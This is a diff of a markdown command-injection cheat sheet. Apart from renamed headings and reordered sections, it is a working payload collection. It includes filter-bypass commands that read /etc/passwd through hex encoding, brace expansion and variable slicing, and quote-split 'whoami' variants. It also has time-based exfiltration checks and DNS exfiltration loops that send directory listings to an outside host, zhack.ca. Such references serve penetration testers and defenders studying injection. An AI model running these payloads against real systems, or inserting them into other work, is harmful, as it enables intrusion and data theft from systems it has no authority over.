@@ -7,34 +7,33 @@
 
 * [Tools](#tools)
 * [Methodology](#methodology)
-    * [Basic commands](#basic-commands)
-    * [Chaining commands](#chaining-commands)
-    * [Argument injection](#argument-injection)
-    * [Inside a command](#inside-a-command)
+    * [Basic Commands](#basic-commands)
+    * [Chaining Commands](#chaining-commands)
+    * [Argument Injection](#argument-injection)
+    * [Inside A Command](#inside-a-command)
 * [Filter Bypasses](#filter-bypasses)
-    * [Bypass without space](#bypass-without-space)
-    * [Bypass with a line return](#bypass-with-a-line-return)
-    * [Bypass with backslash newline](#bypass-with-backslash-newline)
-    * [Bypass characters filter via hex encoding](#bypass-characters-filter-via-hex-encoding)
-    * [Bypass with Tilde expansion](#bypass-with-tilde-expansion)
-    * [Bypass with Brace expansion](#bypass-with-brace-expansion)
-    * [Bypass characters filter](#bypass-characters-filter)
-    * [Bypass blacklisted words](#bypass-blacklisted-words)
-    * [Bypass with single quote](#bypass-with-single-quote)
-    * [Bypass with double quote](#bypass-with-double-quote)
-    * [Bypass with backticks](#bypass-with-backticks)
-    * [Bypass with backslash and slash](#bypass-with-backslash-and-slash)
-    * [Bypass with $@](#bypass-with-)
-    * [Bypass with $()](#bypass-with--1)
-    * [Bypass with variable expansion](#bypass-with-variable-expansion)
-    * [Bypass with wildcards](#bypass-with-wildcards)
+    * [Bypass Without Space](#bypass-without-space)
+    * [Bypass With A Line Return](#bypass-with-a-line-return)
+    * [Bypass With Backslash Newline](#bypass-with-backslash-newline)
+    * [Bypass With Tilde Expansion](#bypass-with-tilde-expansion)
+    * [Bypass With Brace Expansion](#bypass-with-brace-expansion)
+    * [Bypass Characters Filter](#bypass-characters-filter)
+    * [Bypass Characters Filter Via Hex Encoding](#bypass-characters-filter-via-hex-encoding)
+    * [Bypass With Single Quote](#bypass-with-single-quote)
+    * [Bypass With Double Quote](#bypass-with-double-quote)
+    * [Bypass With Backticks](#bypass-with-backticks)
+    * [Bypass With Backslash And Slash](#bypass-with-backslash-and-slash)
+    * [Bypass With $@](#bypass-with-)
+    * [Bypass With $()](#bypass-with--1)
+    * [Bypass With Variable Expansion](#bypass-with-variable-expansion)
+    * [Bypass With Wildcards](#bypass-with-wildcards)
 * [Data Exfiltration](#data-exfiltration)
-    * [Time based data exfiltration](#time-based-data-exfiltration)
-    * [DNS based data exfiltration](#dns-based-data-exfiltration)
+    * [Time Based Data Exfiltration](#time-based-data-exfiltration)
+    * [Dns Based Data Exfiltration](#dns-based-data-exfiltration)
 * [Polyglot Command Injection](#polyglot-command-injection)
 * [Tricks](#tricks)
-    * [Backgrounding long running commands](#backgrounding-long-running-commands)
-    * [Remove arguments after the injection](#remove-arguments-after-the-injection)
+    * [Backgrounding Long Running Commands](#backgrounding-long-running-commands)
+    * [Remove Arguments After The Injection](#remove-arguments-after-the-injection)
 * [Labs](#labs)
     * [Challenge](#challenge)
 * [References](#references)
@@ -69,7 +68,7 @@ If an attacker provides input like `8.8.8.8; cat /etc/passwd`, the actual comman
 This means the system would first `ping 8.8.8.8` and then execute the `cat /etc/passwd` command, which would display the contents of the `/etc/passwd` file, potentially revealing sensitive information.
 
 
-### Basic commands
+### Basic Commands
 
 Execute the command and voila :p
 
@@ -83,7 +82,7 @@ sys:x:3:3:sys:/dev:/bin/sh
 ```
 
 
-### Chaining commands
+### Chaining Commands
 
 In many command-line interfaces, especially Unix-like systems, there are several characters that can be used to chain or manipulate commands. 
 
@@ -132,7 +131,7 @@ Sometimes, direct command execution from the injection might not be possible, bu
     ```
     
 
-### Inside a command
+### Inside A Command
 
 * Command injection using backticks. 
   ```bash
@@ -146,7 +145,7 @@ Sometimes, direct command execution from the injection might not be possible, bu
 
 ## Filter Bypasses
 
-### Bypass without space
+### Bypass Without Space
 
 * `$IFS` is a special shell variable called the Internal Field Separator. By default, in many shells, it contains whitespace characters (space, tab, newline). When used in a command, the shell will interpret `$IFS` as a space. `$IFS` does not directly work as a separator in commands like `ls`, `wget`; use `${IFS}` instead. 
   ```powershell
@@ -177,7 +176,7 @@ Sometimes, direct command execution from the injection might not be possible, bu
   ```
 
 
-### Bypass with a line return
+### Bypass With A Line Return
 
 Commands can also be run in sequence with newlines
 
@@ -187,7 +186,7 @@ ls
 ```
 
 
-### Bypass with backslash newline
+### Bypass With Backslash Newline
 
 * Commands can be broken into parts by using backslash followed by a newline
   ```powershell
@@ -201,7 +200,48 @@ ls
   ```
 
 
-### Bypass characters filter via hex encoding
+### Bypass With Tilde Expansion
+
+```powershell
+echo ~+
+echo ~-
+```
+
+### Bypass With Brace Expansion
+
+```powershell
+{,ip,a}
+{,ifconfig}
+{,ifconfig,eth0}
+{l,-lh}s
+{,echo,#test}
+{,$"whoami",}
+{,/?s?/?i?/c?t,/e??/p??s??,}
+```
+
+
+### Bypass Characters Filter
+
+Commands execution without backslash and slash - linux bash
+
+```powershell
+swissky@crashlab:~$ echo ${HOME:0:1}
+/
+
+swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
+root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab:~$ echo . | tr '!-0' '"-1'
+/
+
+swissky@crashlab:~$ tr '!-0' '"-1' <<< .
+/
+
+swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+root:x:0:0:root:/root:/bin/bash
+```
+
+### Bypass Characters Filter Via Hex Encoding
 
 ```powershell
 swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
@@ -229,51 +269,7 @@ swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 root:x:0:0:root:/root:/bin/bash
 ```
 
-### Bypass with Tilde expansion
-
-```powershell
-echo ~+
-echo ~-
-```
-
-### Bypass with Brace expansion
-
-```powershell
-{,ip,a}
-{,ifconfig}
-{,ifconfig,eth0}
-{l,-lh}s
-{,echo,#test}
-{,$"whoami",}
-{,/?s?/?i?/c?t,/e??/p??s??,}
-```
-
-
-### Bypass characters filter
-
-Commands execution without backslash and slash - linux bash
-
-```powershell
-swissky@crashlab:~$ echo ${HOME:0:1}
-/
-
-swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
-root:x:0:0:root:/root:/bin/bash
-
-swissky@crashlab:~$ echo . | tr '!-0' '"-1'
-/
-
-swissky@crashlab:~$ tr '!-0' '"-1' <<< .
-/
-
-swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
-root:x:0:0:root:/root:/bin/bash
-```
-
-
-### Bypass Blacklisted words
-
-#### Bypass with single quote
+### Bypass With Single Quote
 
 ```powershell
 w'h'o'am'i
@@ -281,7 +277,7 @@ wh''oami
 'w'hoami
 ```
 
-#### Bypass with double quote
+### Bypass With Double Quote
 
 ```powershell
 w"h"o"am"i
@@ -289,20 +285,20 @@ wh""oami
 "wh"oami
 ```
 
-#### Bypass with backticks
+### Bypass With Backticks
 
 ```powershell
 wh``oami
 ```
 
-#### Bypass with backslash and slash
+### Bypass With Backslash and Slash
 
 ```powershell
 w\ho\am\i
 /\b\i\n/////s\h
 ```
 
-#### Bypass with $@
+### Bypass With $@
 
 `$0`: Refers to the name of the script if it's being run as a script. If you're in an interactive shell session, `$0` will typically give the name of the shell.
 
@@ -312,7 +308,7 @@ echo whoami|$0
 ```
 
 
-#### Bypass with $()
+### Bypass With $()
 
 ```powershell
 who$()ami
@@ -320,7 +316,7 @@ who$(echo am)i
 who`echo am`i
 ```
 
-#### Bypass with variable expansion
+### Bypass With Variable Expansion
 
 ```powershell
 /???/??t /???/p??s??
@@ -330,7 +326,7 @@ cat ${test//hhh\/hm/}
 cat ${test//hh??hm/}
 ```
 
-#### Bypass with wildcards
+### Bypass With Wildcards
 
 ```powershell
 powershell C:\*\*2\n??e*d.*? # notepad
@@ -340,40 +336,42 @@ powershell C:\*\*2\n??e*d.*? # notepad
 
 ## Data Exfiltration
 
-### Time based data exfiltration
+### Time Based Data Exfiltration
 
-Extracting data : char by char
+Extracting data char by char and detect the correct value based on the delay.
 
-```powershell
-swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
-real    0m5.007s
-user    0m0.000s
-sys 0m0.000s
+* Correct value: wait 5 seconds
+  ```powershell
+  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
+  real    0m5.007s
+  user    0m0.000s
+  sys 0m0.000s
+  ```
 
-swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
-real    0m0.002s
-user    0m0.000s
-sys 0m0.000s
-```
+* Incorrect value: no delay
+  ```powershell
+  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
+  real    0m0.002s
+  user    0m0.000s
+  sys 0m0.000s
+  ```
 
-### DNS based data exfiltration
 
-Based on the tool from `https://github.com/HoLyVieR/dnsbin` also hosted at dnsbin.zhack.ca
+### Dns Based Data Exfiltration
 
-```powershell
+Based on the tool from [HoLyVieR/dnsbin](https://github.com/HoLyVieR/dnsbin), also hosted at [dnsbin.zhack.ca](http://dnsbin.zhack.ca/)
+
 1. Go to http://dnsbin.zhack.ca/
 2. Execute a simple 'ls'
-for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
-```
-
-```powershell
-$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
-```
+  ```powershell
+  for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
+  ```
 
 Online tools to check for DNS based data exfiltration:
 
-- dnsbin.zhack.ca
-- pingb.in
+- http://dnsbin.zhack.ca/
+- https://app.interactsh.com/
+- Burp Collaborator
 
 
 ## Polyglot Command Injection
@@ -402,7 +400,7 @@ A polyglot is a piece of code that is valid and executable in multiple programmi
 
 ## Tricks
 
-### Backgrounding long running commands
+### Backgrounding Long Running Commands
 
 In some instances, you might have a long running command that gets killed by the process injecting it timing out.
 Using `nohup`, you can keep the process running after the parent process exits.
@@ -411,7 +409,7 @@ Using `nohup`, you can keep the process running after the parent process exits.
 nohup sleep 120 > /dev/null &
 ```
 
-### Remove arguments after the injection
+### Remove Arguments After The Injection
 
 In Unix-like command-line interfaces, the `--` symbol is used to signify the end of command options. After `--`, all arguments are treated as filenames and arguments, and not as options.
 
